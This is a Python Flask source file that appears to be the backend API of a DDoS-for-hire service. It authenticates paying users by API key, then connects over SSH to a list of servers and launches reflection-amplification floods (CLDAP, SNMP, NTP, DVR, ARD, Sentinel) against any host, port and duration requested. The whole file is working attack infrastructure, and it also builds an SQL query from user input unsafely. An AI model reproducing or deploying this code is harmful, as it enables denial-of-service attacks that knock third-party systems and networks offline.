from flask import Flask
from flask import request
import threading
from pssh.clients import SSHClient
import queue
import sqlite3
import time
import db



app = Flask(__name__)

METHODS = [
    "CLDAP",
    "SNMPV2",
    "NTP",
    "DVR",
    "STOP",
    "METHOD",
    "METHOD",
    "METHOD"
]

VIPMETHODS = [
    "ARD",
    "SENTINEL"
]

def boot(method, host, port, time):
    cmd = ""
    if method == 'CLDAP': #method name
        cmd = f"screen -dm amp-methods/cldap {host} {port} amp-lists/cldap.txt 2 160000 {time}"
    elif method == 'SNMPV2':
        cmd = f"screen -dm amp-methods/snmp {host} {port} amp-lists/snmp.txt 2 160000 {time}"
    if method == 'NTP':
        cmd = f"screen -dm amp-methods/ntp {host} {port} amp-lists/ntp.txt 2 -1 {time}"
    elif method == 'DVR':
        cmd = f"screen -dm amp-methods/dvr {host} {port} amp-lists/dvr.txt 2 160000 {time}"
    if method == 'ARD':
        cmd = f"screen -dm amp-methods/ard {host} {port} amp-lists/ard.txt 2 160000 {time}"
    elif method == 'SENTINAL':
        cmd = f"screen -dm amp-methods/sentinel {host} {port} amp-lists/sentinel.txt 2 160000 {time}"
    if method == 'METHOD':
        cmd = f""
    elif method == 'STOP':
        cmd = f"pkill {host} -f"
    for server in servers:
        server = server.split()
        ip = server[0]
        user = server[1]
        pw = server[2] 
        try:
            client = SSHClient(host=ip,user=user,password=pw,num_retries=0,timeout=5)
            run = client.run_command(cmd)
        except:
            servers.remove(server)
            print(f"{ip} -> timed out. Removing from servers")
            pass

import userattack

servers = []

@app.route("/")
def api():
    key = request.args.get("key")
    method = request.args.get("method")
    host = request.args.get("host")
    port = request.args.get("port")
    time = request.args.get("time")

    if (key == None) or (method == None) or (host == None) or (port == None) or (time == None):
        return "Missing Parameters"

    found = False
    for apikey in db.conn.execute("SELECT apikey from users;").fetchall():
        if key == apikey[0]:
            found = True
            break
    if not found:
        return "Key Invalid"
    if "CF-Connecting-IP" in request.headers:
        if request.headers["CF-Connecting-IP"] != db.conn.execute(f"SELECT whitelist from users WHERE apikey='{key}';").fetchall()[0][0]:
            return "Access Denied!"
    try:
        int_port = int(port)
        if int_port not in range(1,65536):
            raise ValueError
    except ValueError:
        return "Invalid Port"
    try:
        int_time = int(time)
        if int_time not in range(1,999999):
            raise ValueError
    except ValueError:
        return "Invalid time"
    current_user = None
    for u in userattack.USERS:
        if u.apikey == key:
            current_user = u
            break
    if current_user is None:
        return "Internal Error"
    result = current_user.sendattack(method, host, time)
    if result != 'Attack Sent Successfully':
        return result
    threading.Thread(target=boot,args=[method, host, port, time]).start()
    return f"[API System By Kernel#9235]  Attack Sent | host:{host} | port:{port} | time:{time}  |  method:{method}"
if __name__ == '__main__':
    for data in db.cursor.execute(f"SELECT * FROM users").fetchall():
        userattack.User(key=data[0], maxtime=data[1], conncurrents=data[5], cooldown=data[2], expiry=data[3],isvip=(data[6] > 0))
    with open("hosts.txt",'r') as f:
        for line in f.readlines():
            servers.append(line.strip())
    print(servers)
    app.run(host='0.0.0.0', port=80, threaded=True)